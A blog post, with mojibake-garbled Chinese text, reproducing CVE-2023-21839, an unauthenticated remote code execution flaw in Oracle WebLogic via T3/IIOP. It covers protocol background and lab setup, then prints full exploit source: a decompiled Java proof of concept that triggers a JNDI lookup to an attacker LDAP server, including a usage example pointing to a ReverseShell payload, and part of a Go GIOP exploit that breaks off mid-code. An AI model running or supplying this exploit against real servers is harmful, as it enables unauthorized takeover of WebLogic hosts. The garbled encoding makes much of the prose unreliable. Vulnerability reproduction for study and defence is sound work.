<p><img src="/post/CVE-Test/image-20230226154457424.png" alt="image-20230226154457424"></p>
<table>
<thead>
<tr>
<th align="left">CVE-2023-21839</th>
<th>Oracle WebLogic Server</th>
<th>æ ¸å¿ƒ</th>
<th>T3ï¼Œ IIOP</th>
<th>æ˜¯çš„</th>
<th>7.5</th>
<th>ç½‘ç»œ</th>
<th>ä½</th>
<th>æ²¡æœ‰</th>
<th>æ²¡æœ‰</th>
<th>æœª æ›´æ”¹</th>
<th>é«˜</th>
<th>æ²¡æœ‰</th>
<th>æ²¡æœ‰</th>
<th>12.2.1.3.0 12.2.1.4.0 14.1.1.0.0</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CVE-id</td>
<td>äº§å“</td>
<td>å…ƒä»¶</td>
<td>åè®®</td>
<td>æ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹åˆ©ç”¨ã€‚</td>
<td>è¯„åˆ†</td>
<td>æ”»å‡»å‘é‡</td>
<td>æ”»å¤åˆä½“</td>
<td>Privsâ€™Req[æƒé™ææå‡]</td>
<td>ç”¨æˆ·äº¤äº’</td>
<td>èŒƒå›´</td>
<td>å€¾è¯‰</td>
<td>å†…æ¶µ</td>
<td>å¯ç”¨æ€§</td>
<td>ç‰ˆæœ¬</td>
</tr>
</tbody></table>
<h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><h4 id="weblogicæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#weblogicæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="weblogicæ˜¯ä»€ä¹ˆï¼Ÿ"></a>weblogicæ˜¯ä»€ä¹ˆï¼Ÿ</h4><blockquote>
<p>WebLogicæ˜¯<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086?fromModule=lemma_inlink">ç¾å›½Oracleå…¬å¸</a>å‡ºå“çš„ä¸€ä¸ªapplication serverï¼Œç¡®åˆ‡çš„è¯´æ˜¯ä¸€ä¸ªåŸºäº<a href="https://baike.baidu.com/item/JAVAEE/3066623?fromModule=lemma_inlink">JAVAEE</a>æ¶æ„çš„<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240?fromModule=lemma_inlink">ä¸­é—´ä»¶</a>ï¼ŒWebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523?fromModule=lemma_inlink">ç½‘ç»œåº”ç”¨</a>å’Œ<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731?fromModule=lemma_inlink">æ•°æ®åº“åº”ç”¨</a>çš„<a href="https://baike.baidu.com/item/Java/85979?fromModule=lemma_inlink">Java</a>åº”ç”¨æœåŠ¡å™¨ã€‚å°†Javaçš„åŠ¨æ€åŠŸèƒ½å’ŒJava Enterpriseæ ‡å‡†çš„å®‰å…¨æ€§å¼•å…¥å¤§å‹ç½‘ç»œåº”ç”¨çš„å¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†ä¹‹ä¸­ã€‚</p>
</blockquote>
<h4 id="T3çš„æ¦‚å¿µå’Œäº¤äº’è¿‡ç¨‹"><a href="#T3çš„æ¦‚å¿µå’Œäº¤äº’è¿‡ç¨‹" class="headerlink" title="T3çš„æ¦‚å¿µå’Œäº¤äº’è¿‡ç¨‹"></a>T3çš„æ¦‚å¿µå’Œäº¤äº’è¿‡ç¨‹</h4><blockquote>
<p>T3ä¹Ÿç§°ä¸ºä¸°å¯Œå¥—æ¥å­—ï¼Œæ˜¯BEAå†…éƒ¨åè®®ï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œå¯æ‰©å±•æ€§å¥½ã€‚T3æ˜¯å¤šå·¥åŒå‘å’Œå¼‚æ­¥åè®®ï¼Œç»è¿‡é«˜åº¦ä¼˜åŒ–ï¼Œåªä½¿ç”¨ä¸€ä¸ªå¥—æ¥å­—å’Œä¸€æ¡çº¿ç¨‹ã€‚å€ŸåŠ©è¿™ç§æ–¹æ³•ï¼ŒåŸºäºJavaçš„å®¢æˆ·ç«¯å¯ä»¥æ ¹æ®æœåŠ¡å™¨æ–¹éœ€æ±‚ä½¿ç”¨å¤šç§<code>RMI</code>å¯¹è±¡ï¼Œä½†ä»ä½¿ç”¨ä¸€ä¸ªå¥—æ¥å­—å’Œä¸€æ¡çº¿ç¨‹ã€‚è¿™ä¹Ÿä¸ºæˆ‘ä»¬é™æ€åˆ†æt3åè®®å¸¦æ¥äº†å¾ˆå¤šéº»çƒ¦</p>
<p>RMIåœ¨log4jä¸­æåˆ°ï¼Œå®ƒæ˜¯ä¸€ä¸ªè°ƒç”¨è¿œç¨‹ç±»çš„ä¸€ä¸ªJavaçš„æ–¹æ³•</p>
</blockquote>
<p><strong>äº¤äº’æ–¹å¼</strong></p>
<p><img src="/post/CVE-Test/image-20230226152124965.png" alt="image-20230226152124965"></p>
<h4 id="iiopæ¦‚å¿µ"><a href="#iiopæ¦‚å¿µ" class="headerlink" title="iiopæ¦‚å¿µ"></a>iiopæ¦‚å¿µ</h4><blockquote>
<p>ç”¨æ¥åœ¨CORBA<a href="https://baike.baidu.com/item/%E5%AF%B9%E8%B1%A1%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%90%86?fromModule=lemma_inlink">å¯¹è±¡è¯·æ±‚ä»£ç†</a>ä¹‹é—´äº¤æµçš„åè®®ã€‚Javaä¸­ä½¿å¾—ç¨‹åºå¯ä»¥å’Œå…¶ä»–è¯­è¨€çš„CORBAå®ç°<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7?fromModule=lemma_inlink">äº’æ“ä½œæ€§</a>çš„åè®®ã€‚</p>
<p>è¿™ä¸ªåè®®çš„æœ€åˆé˜¶æ®µæ˜¯è¦å»ºç«‹ä»¥ä¸‹å‡ ä¸ªç»„ä»¶éƒ¨åˆ†ï¼šä¸€ä¸ªIIOPåˆ°HTTPçš„<a href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3?fromModule=lemma_inlink">ç½‘å…³</a>ï¼Œä½¿ç”¨è¿™ä¸ªç½‘å…³å¯ä»¥è®©CORBAå®¢æˆ·è®¿é—®WWWèµ„æºï¼›ä¸€ä¸ªHTTPåˆ°IIOPçš„ç½‘å…³ï¼Œé€šè¿‡è¿™ä¸ªç½‘å…³å¯ä»¥è®¿é—®CORBAèµ„æºï¼›ä¸€ä¸ªä¸ºIIOPå’ŒHTTPæä¾›èµ„æºçš„æœåŠ¡å™¨ï¼Œä¸€ä¸ªèƒ½å¤Ÿå°†IIOPä½œä¸ºå¯è¯†åˆ«åè®®çš„æµè§ˆå™¨ã€‚</p>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯CORBA"><a href="#ä»€ä¹ˆæ˜¯CORBA" class="headerlink" title="ä»€ä¹ˆæ˜¯CORBA"></a>ä»€ä¹ˆæ˜¯CORBA</h4><blockquote>
<p>CORBAï¼ˆCommon ObjectRequest Broker Architectureå…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼‰æ˜¯ç”±<a href="https://baike.baidu.com/item/OMG/3041465?fromModule=lemma_inlink">OMG</a>ç»„ç»‡åˆ¶è®¢çš„ä¸€ç§æ ‡å‡†çš„<a href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink">é¢å‘å¯¹è±¡</a>åº”ç”¨ç¨‹åºä½“ç³»è§„èŒƒã€‚æˆ–è€…è¯´CORBAä½“ç³»ç»“æ„æ˜¯å¯¹è±¡ç®¡ç†ç»„ç»‡ï¼ˆOMGï¼‰ä¸ºè§£å†³<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86/3352171?fromModule=lemma_inlink">åˆ†å¸ƒå¼å¤„ç†</a>ç¯å¢ƒ(DCE)ä¸­ï¼Œç¡¬ä»¶å’Œè½¯ä»¶ç³»ç»Ÿçš„äº’è¿è€Œæå‡ºçš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼›OMGç»„ç»‡æ˜¯ä¸€ä¸ªå›½é™…æ€§çš„<a href="https://baike.baidu.com/item/%E9%9D%9E%E7%9B%88%E5%88%A9%E7%BB%84%E7%BB%87/5622954?fromModule=lemma_inlink">éç›ˆåˆ©ç»„ç»‡</a>ï¼Œå…¶èŒè´£æ˜¯ä¸º<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8/3994271?fromModule=lemma_inlink">åº”ç”¨</a>å¼€å‘æä¾›ä¸€ä¸ªå…¬å…±æ¡†æ¶ï¼Œåˆ¶è®¢å·¥ä¸šæŒ‡å—å’Œå¯¹è±¡ç®¡ç†è§„èŒƒï¼ŒåŠ å¿«å¯¹è±¡æŠ€æœ¯çš„å‘å±•ã€‚</p>
</blockquote>
<h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä»å®˜ç½‘ä¸‹è½½<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><img src="/post/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></p>
<p>ç„¶åè§£å‹å…¶ä¸­çš„jaråŒ…ï¼Œç„¶ååˆ°<code>/disk1/install</code>ä¸‹æ‰§è¡Œcmdè„šæœ¬å°±è¡Œ</p>
<p>ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œç”±äº<code>Weblogic</code>ä¸­çš„<code>maven</code>çš„å­˜åœ¨ï¼Œå…¶è¯†åˆ«<code>jdk</code>æ—¶ï¼Œåªé’ˆå¯¹ç¯å¢ƒå˜é‡å<code>JAVA_HOME</code>çš„è·¯å¾„è¿›è¡Œè¯†åˆ«ï¼Œè€Œå¦‚æœæ˜¯åœ¨PATHä¸­é…ç½®çš„ï¼Œä¼šæŠ¥é”™æ‰¾ä¸åˆ°<code>java</code>ç¯å¢ƒçš„ä½ç½®</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20230226142921961.png" alt="image-20230226142921961"></p>
<p>ç„¶åå†æ¬¡ç®¡ç†å‘˜æ‰§è¡Œæ—¶å‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹æŠ¥é”™æ—¥å¿—</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke â€œjava.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])â€ because â€œcom.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClassâ€ <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>çŒœæµ‹åº”è¯¥æ˜¯æˆ‘çš„<code>java</code>è‡ªèº«çš„é—®é¢˜</p>
<p>ä»<code>stack</code>ä¸­äº†è§£åˆ°äº†ï¼Œåœ¨<code>java9</code>çš„æ—¶å€™ï¼Œ<code>JAXB</code>ï¼ˆJava Architecture for XML Bindingï¼‰<code>[javaæ˜ å°„ä¸ºxmlçš„è¡¨ç¤ºæ–¹å¼]</code> </p>
<p>åœ¨<code>java9</code>å·²ç»è¢«æ ‡è®°ä¸ºå¼ƒç”¨ï¼Œåœ¨<code>java11</code>çš„æ—¶å€™å·²ç»è¢«åˆ é™¤ï¼Œæ‰€ä»¥éœ€è¦æ¢åˆ°ä½ç‰ˆæœ¬çš„<code>java</code>æˆ–è€…åœ¨ä¾èµ–é¡¹æ·»åŠ <code>xml</code>åº“ï¼Œè®©å…¶é‡æ–°æ˜ å°„</p>
<p><a href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ã€å»ºè®®ä¸‹è½½jdk8ä½ç‰ˆæœ¬æœ€æ–¹ä¾¿ï¼Œè®°å¾—å†æ¬¡ä¿®æ”¹JAVA_HOMEç¯å¢ƒå˜é‡ã€‘</p>
<blockquote>
<p>æ³¨æ„ï¼Œè¿™ä¸ªå’Œlog4jçš„åŸå› ä¸€æ ·ï¼Œæ˜¯åŠ è½½è¿œç¨‹æ¶æ„ç±»å¯¼è‡´è¿œç¨‹å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥å¯¹javaæ˜¯å¦å¼€å¯åŠ è½½è¿œç¨‹ç±»ï¼Œä¹Ÿå°±æ˜¯è¦æ³¨æ„å¯¹åº”çš„ç‰ˆæœ¬</p>
<p>ç‰ˆæœ¬â‰¤ <code>JDK 6u211ã€7u201ã€ 8u191ã€11.0.1</code></p>
<p>æ‰€ä»¥æˆ‘è¿™é‡Œå¤ç°çš„ç¯å¢ƒå’Œapacheçš„log4j2ä¸€æ ·ï¼Œæ˜¯<code>JDK-8u171</code>ï¼Œé…ç½®æ–¹å¼å¦‚cve-2021-44228</p>
</blockquote>
<p>å®‰è£…æ­å»ºæŒ‰æµç¨‹æŒ‰å¼•å¯¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://localhost:7001/console</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20230226165115723.png" alt="image-20230226165115723"></p>
<h3 id="æ¸—é€æµç¨‹"><a href="#æ¸—é€æµç¨‹" class="headerlink" title="æ¸—é€æµç¨‹"></a>æ¸—é€æµç¨‹</h3><p>è¿™æ˜¯2023å¹´ä¸€æœˆçš„æ´ï¼Œæˆ‘æ˜¯äºŒæœˆå¤ç°çš„ï¼Œç›®å‰å¤§è‡´å°±ä¸¤ç§payloadå·¥å…·ï¼Œä¸€ä¸ª<code>java</code>çš„ï¼Œä¸€ä¸ª<code>go</code></p>
<p>ä»”ç»†åˆ†æä¸€ä¸‹æ¼æ´çš„åˆ©ç”¨æ¡ä»¶å’Œå½¢æˆåŸå› ï¼Œä»¥åŠä¸¤ä¸ªå·¥å…·çš„è„šæœ¬çš„åŸç†</p>
<blockquote>
<p>goçš„<a href="https://github.com/4ra1n/CVE-2023-21839">4ra1n&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (æ— éœ€Javaä¾èµ–ä¸€é”®RCE) (github.com)</a></p>
<p>javaçš„<a href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p>
</blockquote>
<p>ä¸¤è€…å¤§å·®ä¸å·®ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰goæ›´èˆ’æœä¸€äº›</p>
<blockquote>
<p>åœ¨å…¬ç½‘ä¸Šï¼ŒIIOPåè®®å’ŒNATè½¬æ¢ä¹‹é—´å­˜åœ¨å†²çªçš„ç½‘ç»œé—®é¢˜ï¼Œ</p>
<p>ä¸€èˆ¬åªèƒ½ä¿®æ”¹æºç æˆ–è€…å°è¯•<strong>iiopåè®®netç»•è¿‡</strong><a href="https://xz.aliyun.com/t/8508">Weblogic IIOP åè®®NAT ç½‘ç»œç»•è¿‡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>ã€å†²çªåŸå› å­¦ä¹ è®°åœ¨keynotesä¸Šï¼Œå¤§è‡´å°±æ˜¯ä¸¤è€…ä¹‹é—´çš„ipæŒ‡å‘å’Œipè½¬æ¢å†²çªï¼Œä¸€ä¸ªæ ¹æ®è‡ªèº«è§„åˆ™å‘é€æ•°æ®åˆ°ç§ç½‘ipï¼Œå¦ä¸€ä¸ªæ ¹æ®è‡ªèº«è§„åˆ™æŠŠç§ç½‘ipåˆå˜ä¸ºå…¬ç½‘ipï¼Œä»è€Œé€šè®¯è¿æ¥å¤±è´¥ã€‘</p>
<p>ç”¨goè¿›è¡Œé‡å†™iiopçš„ä¸€äº›åè®®ï¼Œä»è€Œé¿å…åœ¨å¯¹å…¬ç½‘æˆ–è€…dockerè¿›è¡Œæ“ä½œçš„æ—¶å€™å‡ºç°è¿æ¥ç½‘ç»œé”™è¯¯ï¼Œå½“ç„¶javaä¹Ÿæ˜¯å¯ä»¥ä¿®æ”¹iiopè§„åˆ™çš„ï¼Œè§†æƒ…å†µå’Œèƒ½åŠ›è€Œå®š</p>
</blockquote>
<h4 id="è¿œç¨‹ä»£ç æ‰§è¡ŒåŸç†"><a href="#è¿œç¨‹ä»£ç æ‰§è¡ŒåŸç†" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡ŒåŸç†"></a>è¿œç¨‹ä»£ç æ‰§è¡ŒåŸç†</h4><blockquote>
<p>åˆ©ç”¨è¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…é€šè¿‡ <code>T3ã€IIOP</code> è¿›è¡Œç½‘ç»œè®¿é—®ï¼Œä»è€Œå±å®³ Oracle WebLogic Serverã€‚æˆåŠŸæ”»å‡»æ­¤æ¼æ´å¯å¯¼è‡´æœªç»æˆæƒè®¿é—®<code>å…³é”®æ•°æ®æˆ–å®Œå…¨è®¿é—®æ‰€æœ‰ Oracle WebLogic Server å¯è®¿é—®æ•°æ®</code>ã€‚</p>
</blockquote>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>ï¼ˆä¸å¥½çš„å°±æ˜¯éœ€è¦å¯¹åº”javaç‰ˆæœ¬è·‘ï¼Œæ¯ä¸ªç‰ˆæœ¬Javaéƒ½è¦åˆ å»ä¸€äº›ä¸œè¥¿ï¼Œè¿˜æ˜¯goæ•´æ´çš„åŒ…èˆ’æœï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> weblogic.deployment.jms.ForeignOpaqueReference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2023_21839</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JNDI_FACTORY</span> <span class="operator">=</span> <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HOW_TO_USE</span> <span class="operator">=</span> <span class="string">&quot;[*]java -jar ç›®æ ‡ip:ç«¯å£ ldapåœ°å€\ne.g. java -jar 192.168.220.129:7001 ldap://192.168.31.58:1389/Basic/ReverseShell/192.168.220.129/1111&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CVE_2023_21839</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title function_">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, JNDI_FACTORY);</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(HOW_TO_USE);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">t3Url</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapUrl</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> getInitialContext(<span class="string">&quot;t3://&quot;</span> + t3Url);</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        <span class="type">ForeignOpaqueReference</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForeignOpaqueReference</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">jndiEnvironment</span> <span class="operator">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">        jndiEnvironment.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        jndiEnvironment.set(f, env);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">remoteJNDIName</span> <span class="operator">=</span> ForeignOpaqueReference.class.getDeclaredField(<span class="string">&quot;remoteJNDIName&quot;</span>);</span><br><span class="line">        remoteJNDIName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        remoteJNDIName.set(f, ldapUrl);</span><br><span class="line">        <span class="type">String</span> <span class="variable">bindName</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">Random</span>(System.currentTimeMillis())).nextLong() + <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c.bind(bindName, f);</span><br><span class="line">            c.lookup(bindName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GO-å¾…çœ‹"><a href="#GO-å¾…çœ‹" class="headerlink" title="GO(å¾…çœ‹)"></a>GO(å¾…çœ‹)</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;CVE-2023-21839&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	hostConfig <span class="type">string</span></span><br><span class="line">	portConfig <span class="type">int</span></span><br><span class="line">	ldapConfig <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	key1    <span class="type">string</span></span><br><span class="line">	key2    <span class="type">string</span></span><br><span class="line">	key3    <span class="type">string</span></span><br><span class="line">	wlsKey1 <span class="type">string</span></span><br><span class="line">	wlsKey2 <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	ServiceContext0 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;05&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;000000000000010000000d3137322e32362e3131322e310000ec5b&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext1 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;01&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0000000001002005010001&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext2 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;00&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0a0301&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;hostConfig, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ip&quot;</span>)</span><br><span class="line">	flag.IntVar(&amp;portConfig, <span class="string">&quot;port&quot;</span>, <span class="number">7001</span>, <span class="string">&quot;port&quot;</span>)</span><br><span class="line">	flag.StringVar(&amp;ldapConfig, <span class="string">&quot;ldap&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ldap&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> hostConfig == <span class="string">&quot;&quot;</span> || ldapConfig == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(ldapConfig, <span class="string">&quot;ldap&quot;</span>) &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ip: %s\n&quot;</span>, hostConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-port: %d\n&quot;</span>, portConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ldap: %s\n&quot;</span>, ldapConfig)</span><br><span class="line"></span><br><span class="line">	vp := <span class="string">&quot;743320392e322e302e300a41533a3235350a484c3a39320a4d5&quot;</span> +</span><br><span class="line">		<span class="string">&quot;33a31303030303030300a50553a74333a2f2f746573743a373030310a0a&quot;</span></span><br><span class="line">	ver := giop.GetVersion(hostConfig, vp, portConfig)</span><br><span class="line">	<span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span 